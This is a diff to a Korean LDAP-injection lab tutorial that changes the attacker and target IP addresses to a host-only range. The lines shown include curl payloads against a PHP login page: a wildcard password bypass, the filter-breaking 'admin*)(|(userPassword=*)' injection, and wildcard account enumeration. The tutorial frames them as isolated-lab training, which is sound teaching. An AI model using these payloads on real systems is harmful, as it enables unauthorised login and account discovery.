@@ -29,8 +29,8 @@ mermaid: true
 
 | 구분 | 내용 |
 |---|---|
-| 공격자 | Kali Linux (192.168.0.10) — curl, 브라우저 |
-| 대상 | Ubuntu (192.168.0.30) — Apache/PHP + OpenLDAP(slapd) |
+| 공격자 | Kali Linux (192.168.56.10) — curl, 브라우저 |
+| 대상 | Ubuntu (192.168.56.30) — Apache/PHP + OpenLDAP(slapd) |
 | 추가 설치 | `slapd ldap-utils php-ldap` |
 
 > 모든 실습은 본인 소유의 격리된 랩에서만 수행합니다. 실습 후 8장의 정리(cleanup) 절차로 LDAP 서버까지 제거하세요.
@@ -189,11 +189,11 @@ EOF
 
 ```bash
 # 올바른 자격증명
-curl -s -X POST http://192.168.0.30/ldap_login.php -d "user=alice&pass=alicepw"
+curl -s -X POST http://192.168.56.30/ldap_login.php -d "user=alice&pass=alicepw"
 # → 로그인 성공 (matched: 1)
 
 # 틀린 비밀번호
-curl -s -X POST http://192.168.0.30/ldap_login.php -d "user=alice&pass=wrong"
+curl -s -X POST http://192.168.56.30/ldap_login.php -d "user=alice&pass=wrong"
 # → 로그인 실패
 ```
 
@@ -202,7 +202,7 @@ curl -s -X POST http://192.168.0.30/ldap_login.php -d "user=alice&pass=wrong"
 **방법 A — 와일드카드로 비밀번호 무력화**
 
 ```bash
-curl -s -X POST http://192.168.0.30/ldap_login.php --data-urlencode "user=alice" --data-urlencode "pass=*"
+curl -s -X POST http://192.168.56.30/ldap_login.php --data-urlencode "user=alice" --data-urlencode "pass=*"
 ```
 
 `userPassword=*` 는 "비밀번호가 무엇이든 매칭"을 의미하므로, **비밀번호 없이 로그인 성공**이 나오면 취약입니다.
@@ -210,7 +210,7 @@ curl -s -X POST http://192.168.0.30/ldap_login.php --data-urlencode "user=alice"
 **방법 B — 필터를 통째로 항상 참으로 (KISA 대표 페이로드)**
 
 ```bash
-curl -s -X POST http://192.168.0.30/ldap_login.php \
+curl -s -X POST http://192.168.56.30/ldap_login.php \
   --data-urlencode 'user=admin*)(|(userPassword=*)' --data-urlencode "pass=x"
 ```
 
@@ -232,7 +232,7 @@ curl -s -X POST http://192.168.0.30/ldap_login.php \
 
 ```bash
 # uid 가 a 로 시작하는 계정이 있는지
-curl -s -X POST http://192.168.0.30/ldap_login.php --data-urlencode "user=a*" --data-urlencode "pass=*"
+curl -s -X POST http://192.168.56.30/ldap_login.php --data-urlencode "user=a*" --data-urlencode "pass=*"
 ```
 
 `*` 와일드카드로 존재하는 계정 패턴을 추려낼 수 있습니다.
